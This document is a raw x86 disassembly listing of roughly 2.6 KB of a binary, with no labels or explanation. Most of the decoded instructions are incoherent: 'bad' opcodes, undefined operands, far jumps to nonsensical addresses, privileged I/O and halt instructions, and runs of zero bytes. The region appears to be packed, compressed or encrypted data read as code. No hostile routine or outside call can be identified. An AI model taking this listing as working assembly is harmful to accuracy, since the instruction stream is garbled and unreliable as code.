  41dcd4:	jmp    0x7e1:0x9730a12a
  41dcdb:	dec    edi
  41dcdc:	inc    DWORD PTR [esi+ebp*4]
  41dcdf:	and    edx,DWORD PTR [ebx-0x2a724fe4]
  41dce5:	fs ss ds leave 
  41dce9:	push   eax
  41dcea:	cmp    eax,0x5e4a18c0
  41dcef:	shl    ebx,1
  41dcf1:	mov    ah,0x50
  41dcf3:	js     0x41dd62
  41dcf5:	stos   BYTE PTR es:[edi],al
  41dcf6:	or     eax,0xa53877f8
  41dcfb:	loopne 0x41dc94
  41dcfd:	jnp    0x41dcef
  41dcff:	sub    BYTE PTR [ecx-0x5c],al
  41dd02:	bound  ebx,QWORD PTR [ecx-0xf349b33]
  41dd08:	or     ecx,DWORD PTR [ebx-0x7c29eccf]
  41dd0e:	aas    
  41dd0f:	inc    ebp
  41dd10:	stos   DWORD PTR es:[edi],eax
  41dd11:	and    BYTE PTR ds:0x702cfba3,dh
  41dd17:	in     eax,dx
  41dd18:	faddp  st(6),st
  41dd1a:	in     al,0x73
  41dd1c:	clc    
  41dd1d:	lea    esi,[ebp-0x7d]
  41dd20:	test   BYTE PTR [ecx+0x4d],0xf6
  41dd24:	mov    al,ds:0x1d912517
  41dd29:	jecxz  0x41dcec
  41dd2b:	add    BYTE PTR [eax-0x4b18d582],dh
  41dd31:	inc    ecx
  41dd32:	iret   
  41dd33:	aas    
  41dd34:	or     ebp,DWORD PTR [eax+0x1a]
  41dd37:	sub    BYTE PTR [edi+0x78],dl
  41dd3a:	jmp    0xa65c:0xba90fb44
  41dd41:	(bad)  
  41dd42:	hlt    
  41dd43:	push   0xffffffa4
  41dd45:	iret   
  41dd46:	xchg   esp,eax
  41dd47:	out    0x29,eax
  41dd49:	xchg   DWORD PTR [ecx],edx
  41dd4b:	mov    esi,0x384264c7
  41dd50:	jnp    0x41ddb6
  41dd52:	inc    ebx
  41dd53:	outs   dx,BYTE PTR ds:[esi]
  41dd54:	daa    
  41dd55:	jo     0x41dd59
  41dd57:	fbld   TBYTE PTR [edx-0x73f7eb2c]
  41dd5d:	jnp    0x41dd14
  41dd5f:	inc    ebx
  41dd60:	mov    bl,BYTE PTR [ebx]
  41dd62:	sub    bx,di
  41dd65:	inc    ebx
  41dd66:	bound  ebp,QWORD PTR [esi-0x52]
  41dd69:	into   
  41dd6a:	mov    WORD PTR [edx-0x65],ss
  41dd6d:	inc    esi
  41dd6e:	xor    eax,0xb21e0064
  41dd73:	add    eax,0xb110a5e3
  41dd78:	fidiv  WORD PTR [ebp+0x2a]
  41dd7b:	xor    ebp,DWORD PTR [edi]
  41dd7d:	stos   DWORD PTR es:[edi],eax
  41dd7e:	or     BYTE PTR [ebx-0x5f],bh
  41dd81:	mov    al,ds:0x14596c4
  41dd86:	inc    esi
  41dd87:	stos   DWORD PTR es:[edi],eax
  41dd88:	jmp    0x8435861b
  41dd8d:	test   al,0x7
  41dd8f:	repz add BYTE PTR [eax],al
	...
  41ddf2:	add    BYTE PTR [eax],al
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	in     al,0x17
  41de02:	adc    eax,0x13d846b
  41de07:	add    BYTE PTR [ecx+eax*1],al
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	jl     0x41ddc6
  41de0e:	mov    es,WORD PTR [ebx]
  41de10:	mov    ?,WORD PTR [edx-0x721640fb]
  41de16:	(bad)
  41de19:	mov    esp,DWORD PTR [edi-0x134a611c]
  41de1f:	mov    bh,0x40
  41de21:	mov    DWORD PTR ds:0x6d60026c,edi
  41de27:	(bad)  [ecx+0xd675f5c]
  41de2d:	sbb    DWORD PTR [ebx-0x510d0212],edi
  41de33:	cwde   
  41de34:	push   cs
  41de35:	xchg   BYTE PTR [eax+0x62],al
  41de38:	iret   
  41de39:	add    eax,0xb5cd2eac
  41de3e:	adc    ch,dl
  41de40:	xor    eax,0xbb018d3c
  41de45:	mov    ah,0x74
  41de47:	mov    dh,cl
  41de49:	mov    esp,0xe57b3b0c
  41de4e:	push   cs
  41de4f:	cmp    eax,0xaa5f92da
  41de54:	fwait
  41de55:	jbe    0x41dde6
  41de57:	inc    edx
  41de58:	test   DWORD PTR [esi+0x1c5ffc5e],0x33c06828
  41de62:	cwde   
  41de63:	pop    ss
  41de64:	jnp    0x41de65
  41de66:	inc    edx
  41de67:	mov    al,0x8d
  41de69:	(bad)  
  41de6a:	push   0xffffffd6
  41de6c:	or     DWORD PTR [ecx],esp
  41de6e:	ret    0x978b
  41de71:	push   0x15
  41de73:	pop    esi
  41de74:	mov    bh,0x5f
  41de76:	inc    esp
  41de77:	sub    DWORD PTR [ebx],edx
  41de79:	fisubr DWORD PTR [ecx+0x78d1792d]
  41de7f:	dec    edi
  41de80:	sahf   
  41de81:	shl    edi,cl
  41de83:	add    al,0x71
  41de85:	and    DWORD PTR [ecx+0x4ee7fb92],esp
  41de8b:	sti    
  41de8c:	aad    0xd3
  41de8e:	sub    BYTE PTR [ecx+ebx*4+0x5438aa0c],cl
  41de95:	rcl    DWORD PTR [ebp+0x23acbfe5],1
  41de9b:	push   edx
  41de9c:	sbb    eax,0xd5a9d28f
  41dea1:	lock enter 0x369b,0x69
  41dea6:	xor    eax,ebp
  41dea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dea9:	(bad)  
  41deaa:	mov    bl,0x40
  41deac:	sbb    eax,0x9618ee4a
  41deb1:	xchg   edx,eax
  41deb2:	add    edx,DWORD PTR ds:0xe2d9652
  41deb8:	xchg   esi,eax
  41deb9:	push   eax
  41deba:	in     al,dx
  41debb:	jmp    0x41de68
  41debd:	lods   eax,DWORD PTR ds:[esi]
  41debe:	pop    ebp
  41debf:	and    eax,0xf7a24f1f
  41dec4:	add    ecx,esp
  41dec6:	xor    al,0x40
  41dec8:	push   ecx
  41dec9:	outs   dx,BYTE PTR ds:[esi]
  41deca:	push   ebx
  41decb:	cmp    DWORD PTR [eax+0x1e09ced],esp
  41ded1:	lea    ebx,[edx+0x29]
  41ded4:	(bad)  
  41ded5:	in     al,dx
  41ded6:	adc    BYTE PTR [ebp+0x26],al
  41ded9:	and    al,0x2a
  41dedb:	xchg   esp,eax
  41dedc:	add    al,0x4e
  41dede:	test   esi,0x1c6a6a62
  41dee4:	xor    bl,BYTE PTR [ebx+0x2e]
  41dee7:	jge    0x41df67
  41dee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41deea:	out    0x33,eax
  41deec:	add    DWORD PTR [edi+0x74a2fa1b],esp
  41def2:	push   edx
  41def3:	and    edi,DWORD PTR [ecx-0x70]
  41def6:	gs push ebp
  41def8:	push   edx
  41def9:	or     eax,ecx
  41defb:	dec    edi
  41defc:	call   0x2a80:0x645949e2
  41df03:	fsubr  QWORD PTR [ecx-0x14]
  41df06:	popf   
  41df07:	fidiv  WORD PTR [esi+edx*1+0x201c630b]
  41df0e:	pop    ecx
  41df0f:	jmp    0x0:0x0
	...
  41df72:	add    BYTE PTR [eax],al
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x2eda9ce9
  41df82:	pop    eax
  41df83:	sub    DWORD PTR [eax+0x400013e],ecx
  41df89:	add    DWORD PTR [eax],eax
  41df8b:	add    BYTE PTR [eax-0x68],dh
  41df8e:	test   eax,0x6066923
  41df93:	aas    
  41df94:	jmp    0x4f4c:0x27359f0a
  41df9b:	outs   dx,BYTE PTR ds:[esi]
  41df9c:	push   ss
  41df9d:	add    eax,0x190fc245
  41dfa2:	inc    edi
  41dfa3:	push   ecx
  41dfa4:	in     eax,0x2
  41dfa6:	add    edi,ecx
  41dfa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfa9:	into   
  41dfaa:	addr16 inc esp
  41dfac:	jae    0x41df50
  41dfae:	imul   edx,DWORD PTR [ecx],0xb06568a3
  41dfb4:	adc    DWORD PTR ds:0x6fc2b1d,0x1
  41dfbb:	push   esp
  41dfbc:	and    DWORD PTR [edi+edx*8],ebp
  41dfbf:	enter  0x35b2,0xce
  41dfc3:	sbb    eax,0x3a9118e6
  41dfc8:	cmp    ebp,edx
  41dfca:	xchg   esp,eax
  41dfcb:	jmp    0x2260:0x58b528aa
  41dfd2:	enter  0x71e0,0xf8
  41dfd6:	icebp  
  41dfd7:	cs jnp 0x41dfcb
  41dfda:	out    dx,eax
  41dfdb:	adc    al,0xae
  41dfdd:	in     eax,dx
  41dfde:	add    BYTE PTR [esi-0x7a161111],dh
  41dfe4:	fs add dl,BYTE PTR ds:[ebp+ebx*4-0x60bdd601]
  41dfed:	push   ebp
  41dfee:	sbb    eax,0x24919227
  41dff3:	popf   
  41dff4:	jp     0x41dfbb
  41dff6:	cwde   
  41dff7:	jg     0x41dfb1
  41dff9:	lahf   
  41dffa:	mov    eax,0x2aa87f63
  41dfff:	mov    esi,0xcdf173c
  41e004:	sbb    cl,BYTE PTR [eax-0x1b]
  41e007:	xor    al,0xa5
  41e009:	aam    0xd4
  41e00b:	aam    0x2d
  41e00d:	jmp    0x7304f3b0
  41e012:	fwait
  41e013:	int3   
  41e014:	cmp    esp,eax
  41e016:	dec    eax
  41e017:	aaa    
  41e018:	or     al,0x11
  41e01a:	xlat   BYTE PTR ds:[ebx]
  41e01b:	adc    bh,BYTE PTR [ebx]
  41e01d:	pop    esi
  41e01e:	mov    al,ds:0xf2634882
  41e023:	cmp    eax,esi
  41e025:	or     eax,0xbd036877
  41e02a:	sub    bl,BYTE PTR [edx-0x7ba5c4f5]
  41e030:	popa   
  41e031:	dec    edx
  41e032:	repz mov ?,WORD PTR [ebp-0x1d]
  41e036:	inc    edx
  41e037:	enter  0x70e1,0xb0
  41e03b:	mov    ebx,0x15f14114
  41e040:	sub    al,0x62
  41e042:	scas   eax,DWORD PTR es:[edi]
  41e043:	inc    ebp
  41e044:	daa    
  41e045:	pop    esp
  41e046:	cmp    ebp,edx
  41e048:	sub    bl,0xe1
  41e04b:	cmp    DWORD PTR [ebx+0x747d682f],ebx
  41e051:	add    ah,BYTE PTR [ecx+0x74]
  41e054:	call   0xbdc4:0x3ab8b08d
  41e05b:	imul   DWORD PTR [eax-0x27]
  41e05e:	cmp    ebx,ebx
  41e060:	js     0x41e08e
  41e062:	push   ebx
  41e063:	dec    edx
  41e064:	inc    edx
  41e065:	mov    al,ds:0x6a43ad9f
  41e06a:	sub    BYTE PTR [edi+eax*2-0x3b],0x67
  41e06f:	(bad)  
  41e070:	repz sti 
  41e072:	mov    ah,0x30
  41e074:	sub    al,0xaa
  41e076:	in     eax,0xaa
  41e078:	xor    edi,DWORD PTR [edx-0x65e2095f]
  41e07e:	jp     0x41e024
  41e080:	stos   DWORD PTR es:[edi],eax
  41e081:	and    edx,DWORD PTR [ecx-0xf5393f5]
  41e087:	rcr    DWORD PTR [esi],0x0
  41e08a:	shl    DWORD PTR [ecx-0x78],0x6a
  41e08e:	test   DWORD PTR [ecx+0x0],0x0
	...
  41e0f4:	dec    edi
  41e0f5:	push   ebx
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	scas   eax,DWORD PTR es:[edi]
  41e101:	cmp    dl,BYTE PTR [esp+ebp*2]
  41e104:	mov    WORD PTR [edi],?
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    al,0x1
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	fs push esp
  41e10e:	sbb    bl,dh
  41e110:	cmp    esi,0xd2f9bfc5
  41e116:	or     al,BYTE PTR [edi+0x17]
  41e119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e11a:	es jbe 0x41e0a3
  41e11d:	dec    edx
  41e11e:	lds    ebp,FWORD PTR [esi]
  41e120:	sar    esi,cl
  41e122:	ins    DWORD PTR es:[edi],dx
  41e123:	xor    cx,WORD PTR [esi-0x4d]
  41e127:	mov    al,ds:0x75dda6e1
  41e12c:	add    DWORD PTR [bp+di],esi
  41e12f:	and    bh,BYTE PTR [edi+0x266d8b84]
  41e135:	push   ecx
  41e136:	pop    ecx
  41e137:	jbe    0x41e163
  41e139:	jl     0x41e15a
  41e13b:	inc    eax
  41e13c:	push   ecx
  41e13d:	popa   
  41e13e:	shl    BYTE PTR [edi+0x1b55588a],0xae
  41e145:	cmp    DWORD PTR [esi+ecx*1],ebx
  41e148:	adc    DWORD PTR [esi+0x1],edx
  41e14b:	inc    esp
  41e14c:	pop    esp
  41e14d:	dec    esi
  41e14e:	ficomp DWORD PTR [eax-0x29ea358d]
  41e154:	fmul   DWORD PTR [edi-0x26]
  41e157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e158:	pop    eax
  41e159:	add    ebp,DWORD PTR [esi]
  41e15b:	pop    eax
  41e15c:	pop    esp
  41e15d:	push   ss
  41e15e:	out    0xb1,eax
  41e160:	stos   DWORD PTR es:[edi],eax
  41e161:	cmp    DWORD PTR [edi-0x35072e4e],eax
  41e167:	jae    0x41e124
  41e169:	mov    eax,ds:0xd8e37d02
  41e16e:	jns    0x41e16a
  41e170:	in     eax,0x5d
  41e172:	mov    dh,0x33
  41e174:	or     esp,0xf7871edc
  41e17a:	ret    
  41e17b:	mov    BYTE PTR ds:0xbf45a523,ch
  41e181:	fwait
  41e182:	jae    0x41e1f2
  41e184:	xor    BYTE PTR [eax+0x1dc703b2],bl
  41e18a:	sub    eax,0x4228e3c5
  41e18f:	xchg   BYTE PTR [ebx],bl
  41e191:	imul   esp,DWORD PTR [eax+edx*4],0xd4c854f2
  41e198:	mov    al,0x9e
  41e19a:	ja     0x41e149
  41e19c:	xor    DWORD PTR [ecx+0x651eb606],0xebd81771
  41e1a6:	or     al,BYTE PTR fs:[ecx+0xc]
  41e1aa:	sub    BYTE PTR [eax+0x663f927e],dl
  41e1b0:	jge    0x41e1bb
  41e1b2:	cwde   
  41e1b3:	mov    ch,0x41
  41e1b5:	fdivr  st,st(0)
  41e1b7:	std    
  41e1b8:	jo     0x41e206
  41e1ba:	addr16 (bad) 
  41e1bd:	call   0xa7a7ad54
  41e1c2:	cli    
  41e1c3:	or     DWORD PTR [eax+0x4e84899b],esi
  41e1c9:	ds push esp
  41e1cb:	mov    WORD PTR [ecx+0x0],ss
  41e1ce:	add    al,BYTE PTR [esi]
  41e1d0:	push   DWORD PTR [ecx]
  41e1d2:	or     ah,BYTE PTR [ecx]
  41e1d4:	dec    ebp
  41e1d5:	add    dh,BYTE PTR [ebx+0x40e78b85]
  41e1db:	jbe    0x41e231
  41e1dd:	(bad)  
  41e1de:	sub    eax,0x1f2092fc
  41e1e3:	push   0x6e
  41e1e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1e6:	xchg   edx,eax
  41e1e7:	js     0x41e1a8
  41e1e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1ea:	test   al,0xcb
  41e1ec:	sub    DWORD PTR [esi+ebp*1-0xbcdcdf],eax
  41e1f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f4:	dec    ecx
  41e1f5:	arpl   WORD PTR ds:0x2a384fe8,bx
  41e1fb:	add    BYTE PTR [edx+eax*8],0x0
  41e1ff:	call   0x6a27:0x74847c87
  41e206:	mov    WORD PTR [edx],es
  41e208:	into   
  41e209:	test   eax,0xe8deb1c5
  41e20e:	nop
  41e20f:	stos   DWORD PTR es:[edi],eax
	...
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0xcf
  41e281:	call   0x1:0x4090c0ce
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	shl    DWORD PTR [ebp-0x48],1
  41e28f:	sbb    al,0x77
  41e291:	ficomp WORD PTR [edi-0x31]
  41e294:	sbb    bl,BYTE PTR [edx]
  41e296:	or     al,0x54
  41e298:	push   ds
  41e299:	lods   eax,DWORD PTR ds:[esi]
  41e29a:	pushf  
  41e29b:	lea    edx,[edi-0x8]
  41e29e:	scas   al,BYTE PTR es:[edi]
  41e29f:	add    al,0x28
  41e2a1:	pop    es
  41e2a2:	push   edx
  41e2a3:	out    dx,al
  41e2a4:	iret   
  41e2a5:	(bad)  
  41e2a6:	push   esi
  41e2a7:	rcl    DWORD PTR [ebp-0x2b81b241],1
  41e2ad:	pop    ecx
  41e2ae:	jle    0x41e2e9
  41e2b0:	mov    esi,0xbe3b493f
  41e2b5:	icebp  
  41e2b6:	pop    edx
  41e2b7:	adc    eax,0x6a6fbab2
  41e2bc:	sbb    dl,dh
  41e2be:	stos   DWORD PTR es:[edi],eax
  41e2bf:	jb     0x41e257
  41e2c1:	test   al,0xc7
  41e2c3:	(bad)  
  41e2c4:	test   eax,0x3b016f01
  41e2c9:	mov    ds:0x8119f42,eax
  41e2ce:	jg     0x41e2b8
  41e2d0:	inc    esp
  41e2d1:	cmc    
  41e2d2:	xchg   edx,eax
  41e2d3:	cmp    ebx,DWORD PTR [eax+0x7d5f7d6e]
  41e2d9:	or     dl,0xb5
  41e2dc:	sbb    BYTE PTR [edi+0x8d85f9e],ch
  41e2e2:	mov    cl,0x65
  41e2e4:	sub    DWORD PTR [esi-0x4ac7f7a0],0xb9ef5442
  41e2ee:	loopne 0x41e282
  41e2f0:	push   0xffffff80
  41e2f2:	push   edx
  41e2f3:	out    dx,eax
  41e2f4:	pop    edi
  41e2f5:	sar    BYTE PTR [eax-0xf],0x6f
  41e2f9:	sub    ch,BYTE PTR [edx]
  41e2fb:	push   edi
  41e2fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2fd:	(bad)  
  41e2fe:	sub    eax,0xc3d548d0
  41e303:	nop
  41e304:	add    al,0xdf
  41e306:	rol    DWORD PTR [eax],cl
  41e308:	cmp    ebp,DWORD PTR [eax]
  41e30a:	xlat   BYTE PTR ds:[ebx]
  41e30b:	lea    ebx,[edx]
  41e30d:	test   al,0xa
  41e30f:	mov    DWORD PTR [ecx+0x5fa62409],ecx
  41e315:	xchg   esp,eax
  41e316:	or     ah,BYTE PTR [edi-0x4f]
  41e319:	mov    bl,0x64
  41e31b:	call   0x4265cbc2
  41e320:	mov    edi,0x9dd8c71d
  41e325:	add    BYTE PTR [ebx+0x196ead65],0x33
  41e32c:	call   0x8742:0xeac857e8
  41e333:	jmp    0xaffe:0x68e88769
  41e33a:	inc    DWORD PTR [ebp+0x737823a0]
  41e340:	xor    BYTE PTR [ebx-0x48],al
  41e343:	mov    ds:0xf9d9e508,al
  41e348:	imul   esi,DWORD PTR [ebx+0x43],0x52487f55
  41e34f:	(bad)  
  41e350:	jmp    0x41e367
  41e352:	inc    BYTE PTR [ecx]
  41e354:	fldenv [ecx]
  41e356:	sub    DWORD PTR [ebx],edi
  41e358:	mov    esp,0xfeaee9e1
  41e35d:	das    
  41e35e:	popf   
  41e35f:	stos   DWORD PTR es:[edi],eax
  41e360:	dec    esp
  41e361:	adc    DWORD PTR [ebp+eiz*2-0x2b0c14c7],0xf40616b3
  41e36c:	in     eax,dx
  41e36d:	dec    eax
  41e36e:	xrelease xchg BYTE PTR [ebx+eiz*8],bh
  41e372:	addr16 push ecx
  41e374:	push   cs
  41e375:	jecxz  0x41e322
  41e377:	lea    eax,[edi]
  41e379:	jl     0x41e354
  41e37b:	out    0x88,al
  41e37d:	popa   
  41e37e:	mov    esi,0xb33fd0e6
  41e383:	push   0x1a469154
  41e388:	je     0x41e34b
  41e38a:	adc    eax,0x1063f715
  41e38f:	ret    
	...
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x8434c109
  41e403:	jmp    0x104:0x14194
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	outs   dx,BYTE PTR ds:[esi]
  41e40d:	add    eax,0x5d252586
  41e412:	and    esi,eax
  41e414:	cmc    
  41e415:	mov    DWORD PTR [ebx],ebx
  41e417:	pop    esp
  41e418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e419:	inc    esp
  41e41a:	rcr    BYTE PTR [ebp+edx*1-0x7fefa090],0x85
  41e422:	test   dl,ch
  41e424:	inc    ebx
  41e425:	mov    al,ds:0xd7de6c06
  41e42a:	push   edi
  41e42b:	inc    ebp
  41e42c:	xchg   esi,eax
  41e42d:	in     eax,0x5d
  41e42f:	(bad)  
  41e430:	mov    ecx,0x149f3ed9
  41e435:	mov    BYTE PTR [ebp-0x17],bl
  41e438:	cmp    ch,BYTE PTR [ebp+0x6d]
  41e43b:	ss xor al,0x89
  41e43e:	sahf   
  41e43f:	mov    eax,ds:0xaff43c8c
  41e444:	cmc    
  41e445:	mov    esp,0xb6a0aea
  41e44a:	mov    ds:0x224619d4,eax
  41e44f:	shl    ebp,cl
  41e451:	cld    
  41e452:	jb     0x41e3df
  41e454:	test   BYTE PTR [eax+0x784f24],ah
  41e45a:	mov    esi,0x5bf362a8
  41e45f:	sbb    eax,0xad87d90c
  41e464:	test   ebx,esi
  41e466:	jg     0x41e425
  41e468:	xor    eax,0x97e5959b
  41e46d:	test   DWORD PTR [edx+ebp*2-0x3fa85c5],ebp
  41e474:	pop    eax
  41e475:	loop   0x41e404
  41e477:	pop    ecx
  41e478:	inc    edx
  41e479:	mov    edx,0x4810acdd
  41e47e:	mov    bl,0x25
  41e480:	cmc    
  41e481:	aad    0x0
  41e483:	inc    esp
  41e484:	out    dx,eax
  41e485:	xor    dl,ch
  41e487:	mov    WORD PTR [edi-0x23185a6a],?
  41e48d:	push   ebx
  41e48e:	les    edi,FWORD PTR [edi+esi*1+0x7d]
  41e492:	test   BYTE PTR fs:[esi+0x6057bec],0xb
  41e49a:	fcmovnbe st,st(0)
  41e49c:	sbb    al,0xd1
  41e49e:	les    ebx,FWORD PTR [ebp+0x1a]
  41e4a1:	jnp    0x41e4e3
  41e4a3:	inc    edi
  41e4a4:	inc    esi
  41e4a5:	pop    esp
  41e4a6:	inc    edi
  41e4a7:	test   al,0x58
  41e4a9:	cmp    BYTE PTR ds:0x6df44a53,bh
  41e4af:	pop    ss
  41e4b0:	mov    ?,WORD PTR [ebx-0x3]
  41e4b3:	push   es
  41e4b4:	xchg   edi,eax
  41e4b5:	out    dx,eax
  41e4b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4b7:	in     al,dx
  41e4b8:	or     ah,BYTE PTR ds:0x6c562757
  41e4be:	cmp    al,0xb1
  41e4c0:	mov    edx,0xd4cddc49
  41e4c5:	mov    BYTE PTR [ebp-0x2dc7a65e],0xed
  41e4cc:	sub    ah,BYTE PTR [esi-0x19]
  41e4cf:	cmp    DWORD PTR [edx+0x3dde8c9f],0x31183392
  41e4d9:	sub    al,0x17
  41e4db:	lds    ebx,FWORD PTR [edi+0x646b6c]
  41e4e1:	mov    al,0x33
  41e4e3:	outs   dx,BYTE PTR ds:[esi]
  41e4e4:	xchg   ebp,eax
  41e4e5:	xchg   DWORD PTR cs:[edx-0x45f3e6c7],ebp
  41e4ec:	hlt    
  41e4ed:	or     al,0xc3
  41e4ef:	dec    edi
  41e4f0:	mov    ebx,0xd48bf1b6
  41e4f5:	mov    ?,WORD PTR [eax-0x19]
  41e4f8:	pop    es
  41e4f9:	pushf  
  41e4fa:	add    dl,BYTE PTR [eax-0xd8593ef]
  41e500:	jmp    0x7c04db58
  41e505:	fsub   DWORD PTR [edx-0x46]
  41e508:	dec    esi
  41e509:	clc    
  41e50a:	cmp    ebx,0x7b
  41e50d:	icebp  
  41e50e:	lahf   
  41e50f:	lea    eax,[eax]
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e52d
  41e581:	ja     0x41e580
  41e583:	xchg   edx,eax
  41e584:	cwde   
  41e585:	inc    edx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    al,0x1
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	ins    BYTE PTR es:[edi],dx
  41e58d:	popf   
  41e58e:	sbb    eax,0x7e06e373
  41e593:	jbe    0x41e54a
  41e595:	pop    edx
  41e596:	call   0x6acd:0xb8e9d0a1
  41e59d:	jmp    FWORD PTR [eax+0x5c9e913b]
  41e5a3:	mov    dl,0x83
  41e5a5:	outs   dx,DWORD PTR ds:[esi]
  41e5a6:	jbe    0x41e587
  41e5a8:	xchg   BYTE PTR [eax],bl
  41e5aa:	std    
  41e5ab:	cli    
  41e5ac:	outs   dx,DWORD PTR ds:[esi]
  41e5ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5ae:	mov    dh,BYTE PTR [edi]
  41e5b0:	dec    ebp
  41e5b1:	inc    edi
  41e5b2:	loope  0x41e5ea
  41e5b4:	or     dh,BYTE PTR [eax+edi*2+0x14610a35]
  41e5bb:	jmp    0xccc9c8a
  41e5c0:	ds lahf 
  41e5c2:	mov    esi,DWORD PTR [edi]
  41e5c4:	adc    BYTE PTR [ecx],ah
  41e5c6:	sahf   
  41e5c7:	aad    0xa8
  41e5c9:	xlat   BYTE PTR ds:[ebx]
  41e5ca:	adc    DWORD PTR [ebx+0x61],esi
  41e5cd:	xchg   DWORD PTR [ecx-0x679505f1],edx
  41e5d3:	lods   eax,DWORD PTR ds:[esi]
  41e5d4:	repnz dec esi
  41e5d6:	enter  0x4c3e,0x8a
  41e5da:	enter  0xd665,0x84
  41e5de:	inc    ecx
  41e5df:	mov    edx,ss
  41e5e1:	pop    ecx
  41e5e2:	cs mov bh,0x74
  41e5e5:	mov    dl,0xb7
  41e5e7:	call   DWORD PTR [edx-0x50036568]
  41e5ed:	inc    ebx
  41e5ee:	rcr    BYTE PTR [ebp-0x1a],cl
  41e5f1:	mov    eax,ds:0xdbc64efd
  41e5f6:	test   al,0x3b
  41e5f8:	mov    ch,0x1c
  41e5fa:	mov    eax,0xeb0604ea
  41e5ff:	xor    DWORD PTR [ebx+eiz*1-0x7d],edi
  41e603:	mov    al,0x7a
  41e605:	and    cl,cl
  41e607:	loopne 0x41e5a1
  41e609:	fsub   DWORD PTR [esp+edi*8+0x6b]
  41e60d:	test   cl,0xbf
  41e610:	push   0x7c
  41e612:	scas   al,BYTE PTR es:[edi]
  41e613:	(bad)  
  41e614:	sbb    edx,DWORD PTR [eax+0x11]
  41e617:	adc    BYTE PTR [ecx+0x71],dh
  41e61a:	out    0x34,eax
  41e61c:	dec    edi
  41e61d:	jg     0x41e638
  41e61f:	aaa    
  41e620:	pop    esi
  41e621:	les    ebp,FWORD PTR [edx+0x4a]
  41e624:	pop    edi
  41e625:	in     eax,dx
  41e626:	sub    al,0x9a
  41e628:	rcr    DWORD PTR [edx],0xb3
  41e62b:	lea    esp,[ebx-0x18]
  41e62e:	push   eax
  41e62f:	in     al,dx
  41e630:	adc    ebp,esp
  41e632:	int    0xc8
  41e634:	rep stos BYTE PTR es:[edi],al
  41e636:	push   ecx
  41e637:	test   eax,0xba6a4030
  41e63c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e63e:	sub    BYTE PTR [ebx],bl
  41e640:	call   0x8ae20084
  41e645:	imul   ebp,eax,0x4d
  41e648:	ret    
  41e649:	(bad)  
  41e64a:	dec    ebp
  41e64b:	or     bh,BYTE PTR [ebx-0x1d]
  41e64e:	xor    BYTE PTR [ebp+eiz*2-0x9879db4],ah
  41e655:	xchg   edi,eax
  41e656:	push   0x7c
  41e658:	test   eax,0xb042b64f
  41e65d:	or     eax,0xdebb321c
  41e662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e663:	xor    cl,bl
  41e665:	sbb    ecx,ebx
  41e667:	mov    edx,0xd878157d
  41e66c:	ins    DWORD PTR es:[edi],dx
  41e66d:	push   ebp
  41e66e:	(bad)  [edi+0x2213745a]
  41e674:	arpl   di,dx
  41e676:	sbb    esp,DWORD PTR [edx]
  41e678:	add    al,0x7d
  41e67a:	lds    eax,FWORD PTR [ebx]
  41e67c:	dec    eax
  41e67d:	cmp    eax,0xa9a6dfd1
  41e682:	fdivr  st(3),st
  41e684:	pop    edx
  41e685:	lea    esp,[esi+0x6b]
  41e688:	clc    
  41e689:	adc    eax,0x8047ba
  41e68e:	xchg   edx,eax
  41e68f:	lds    eax,FWORD PTR [eax]
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ecx,DWORD PTR [ebp-0x41]
  41e702:	inc    esp
  41e703:	aas    
  41e704:	pushf  
  41e705:	inc    ebx
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	sub    BYTE PTR [edi],al
  41e70e:	or     al,BYTE PTR [ebx-0x6c]
  41e711:	div    BYTE PTR [esi-0x146f6c2c]
